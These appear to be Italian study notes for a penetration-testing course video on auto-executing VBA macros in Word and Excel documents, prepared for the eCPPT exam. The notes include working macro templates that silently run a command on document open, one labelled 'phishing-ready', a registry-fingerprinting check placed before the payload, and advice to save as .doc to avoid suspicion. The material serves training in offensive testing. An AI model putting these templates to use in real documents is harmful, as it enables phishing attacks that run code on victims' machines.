# 013 — VBA Macro Development - Part 2 (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 13/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [013_VBA Macro Development - Part 2.txt](013_VBA Macro Development - Part 2.txt) · [013_VBA Macro Development - Part 2.srt](013_VBA Macro Development - Part 2.srt)

## Concetti chiave

- Una macro NON si esegue automaticamente all'apertura del documento solo perché esiste. Servono **event procedure auto-eseguite**.
- Le due event procedure cardine: **`Document_Open()`** (Word ≥97) e **`AutoOpen()`** (legacy Word ≤97, retro-compatibilità). Si consiglia di includerle **entrambe**.
- Per Excel l'equivalente è **`Workbook_Open()`**.
- Quando si copiano macro tra documenti, il **nome della subroutine deve combaciare** con quello selezionato nel dialog Macros.
- Formati di salvataggio: `.docm` (Macro-Enabled, icona con script visibile) vs `.doc` (Word 97-2003, **meno sospetto** ma supporta comunque macro).
- VBA + `WScript.Shell` può anche **leggere il registry** tramite `RegRead` (es. `HKLM\Software\Microsoft\Windows NT\CurrentVersion\ProductName`).

## Spiegazione approfondita

### Il bug del principiante
Alexis dimostra il classico errore: crei una macro `POC` con `Shell` ma all'apertura del documento non parte nulla. Motivo: la macro è solo definita, non chiamata. Serve un **trigger**.

### Event procedures predefinite
```vba
Sub Document_Open()    ' Word 97+
    POC
End Sub

Sub AutoOpen()         ' Legacy / retro-compat
    POC
End Sub

Sub POC()
    Dim payload As String
    payload = "calc.exe"
    CreateObject("WScript.Shell").Run payload, 0, False
End Sub
```
- **`Document_Open`** scatta quando il documento Word viene aperto.
- **`AutoOpen`** è la versione legacy mantenuta per backwards-compat.
- **Best practice**: definirle entrambe e farle puntare alla stessa sub maliziosa.

### `.doc` vs `.docm` — scelta OPSEC
- **`.docm`** = icona con marchio macro visibile → **sospetto a colpo d'occhio**.
- **`.doc`** (Word 97-2003) = icona neutra, indistinguibile da un doc normale → preferito in phishing.
- Entrambi eseguono macro identicamente.

### Esempio avanzato: `RegRead`
```vba
Sub RegReadDemo()
    Dim WSH As Object
    Set WSH = CreateObject("WScript.Shell")
    Dim regKey As String
    regKey = "HKLM\Software\Microsoft\Windows NT\CurrentVersion\"
    MsgBox "ProductName: " & WSH.RegRead(regKey & "ProductName")
End Sub

Sub Document_Open()
    RegReadDemo
End Sub
```
- Mostra che VBA può interagire profondamente col sistema (lettura registry, enum versione OS, fingerprinting).
- `WScript.Shell.RegRead(path)` legge un valore; `RegWrite` lo scrive (richiede privilegi).
- Path corretto per `ProductName` su Win10: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\ProductName` (NON sotto `Windows\` semplice).

### Errori comuni mostrati nel video
1. Subroutine chiamata `RegRead` confligge con il metodo `WSH.RegRead` → rinominare la sub.
2. Key di registry sbagliata → debug aprendo `regedit`.
3. Salvataggio come `.docx` → macro perse silenziosamente.

## Comandi & strumenti

| Elemento | Sintassi |
|---|---|
| Event Word auto-exec | `Sub Document_Open()` ... `End Sub` |
| Event legacy | `Sub AutoOpen()` ... `End Sub` |
| Event Excel auto-exec | `Sub Workbook_Open()` ... `End Sub` |
| Lettura registry | `CreateObject("WScript.Shell").RegRead(<key>)` |
| Scrittura registry | `.RegWrite <key>, <value>, <type>` |
| Exec processo silente | `.Run "calc.exe", 0, False` |
| Format low-OPSEC | `.docm` (icona macro) |
| Format high-OPSEC | `.doc` (Word 97-2003) |

## Esempi pratici

```vba
' Template "phishing-ready" combo
Sub AutoOpen()
    Payload
End Sub

Sub Document_Open()
    Payload
End Sub

Sub Payload()
    Dim cmd As String
    cmd = "calc.exe"      ' sostituibile con qualsiasi LOLBin / PowerShell
    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub
```

```vba
' Fingerprinting OS prima del payload
Sub Document_Open()
    Dim WSH As Object, ver As String
    Set WSH = CreateObject("WScript.Shell")
    ver = WSH.RegRead("HKLM\Software\Microsoft\Windows NT\CurrentVersion\ProductName")
    If InStr(ver, "Windows 10") > 0 Then Payload
End Sub
```

## Punti d'attenzione per l'esame eCPPT

- **DOMANDA TIPICA**: "Quale event procedure VBA esegue una macro all'apertura di un documento Word?" → **`Document_Open()`** (e/o `AutoOpen()` per legacy).
- **Workbook_Open()** è l'equivalente per Excel.
- Includere **sempre entrambe** `Document_Open` + `AutoOpen` per massima compatibilità.
- Il nome della **subroutine creata da "Macros → Create"** deve combaciare con il default selezionato; quando copi-incolli macro, **rinomina** di conseguenza.
- Salvare come **`.doc`** (97-2003), non `.docm`, per ridurre la suspicion.
- `WScript.Shell.RegRead` è API legittima → utile come PoC e per fingerprinting senza chiamate "loud".
- `.Run cmd, 0, False` = esecuzione **hidden + fire-and-forget** (window style 0, waitOnReturn False).

## Collegamenti con altri video

- Precedente: [[012_VBA Macro Development - Part 1]] — sintassi base + WScript.Shell.
- Prossimo: [[014_Weaponizing VBA Macros with MSF]]
- Bypass nomi sospetti: [[017_Using ActiveX Controls for Macro Execution]] (no `AutoOpen`/`Document_Open`).
- Pretexting per coercitare l'enable: [[018_Pretexting Phishing Documents]].
- Dropper avanzato: [[015_VBA PowerShell Dropper]].
